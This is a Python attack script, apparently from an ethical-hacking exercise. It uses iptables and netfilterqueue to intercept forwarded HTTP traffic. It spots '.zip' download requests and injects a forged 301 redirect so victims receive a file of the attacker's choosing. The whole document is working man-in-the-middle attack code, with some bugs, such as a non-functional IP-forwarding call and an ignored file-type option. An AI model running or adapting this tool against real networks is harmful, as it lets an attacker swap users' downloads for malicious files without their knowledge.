#!/usr/bin/env python

import netfilterqueue
import scapy.all as scapy
import subprocess
import optparse

ack_list = []


def get_arguments():
    parser = optparse.OptionParser()
    parser.add_option("-t", "--type", dest="type", help="The file type you wish to replace.")
    parser.add_option("-l", "--location", dest="location", help="The location of the file you wish to inject.")
    (options, arguments) = parser.parse_args()
    if not options.type:
        parser.error("[-] Please specify the file type you want to replace, use --help for more info")
    elif not options.location:
        parser.error("[-] Please specify the location of the file you want to inject, use --help for more info")
    return options


def set_load(packet, load):
    packet[scapy.Raw].load = load
    del packet[scapy.IP].len
    del packet[scapy.IP].chksum
    del packet[scapy.TCP].chksum
    return packet


def setup_iptables():
    subprocess.call(["echo", "1", ">", "/proc/sys/net/ipv4/ip_forward"])
    subprocess.call(["iptables", "-I", "FORWARD", "-j", "NFQUEUE", "--queue-num", "0"])


def flush_iptables():
    subprocess.call(["iptables", "--flush"])


def process_packet(packet):
    scapy_packet = scapy.IP(packet.get_payload())
    if scapy.Raw in scapy_packet and scapy.TCP in scapy_packet:
        if scapy_packet[scapy.TCP].dport == 80:
            if ".zip" in scapy_packet[scapy.Raw].load:
                print("[+] Detected " + file_type + " Request")
                ack_list.append(scapy_packet[scapy.TCP].ack)
        elif scapy_packet[scapy.TCP].sport == 80:
            if scapy_packet[scapy.TCP].seq in ack_list:
                ack_list.remove(scapy_packet[scapy.TCP].seq)
                print("[+] Replacing file")
                modified_packet = set_load(scapy_packet, "HTTP/1.1 301 Moved Permanently\nLocation: " + file_location + "\n\n")
                packet.set_payload(str(modified_packet))
                print(modified_packet.show())

    packet.accept()


try:
    setup_iptables()
    options = get_arguments()
    file_type = options.type
    file_location = options.location
    queue = netfilterqueue.NetfilterQueue()
    queue.bind(0, process_packet)
    queue.run()
except KeyboardInterrupt:
    print("\n[+]Clearing IP Tables and exiting...")
    flush_iptables()
    print("\n[+] Done.")



#print(scapy_packet.show()) if you want to look at the full layer in future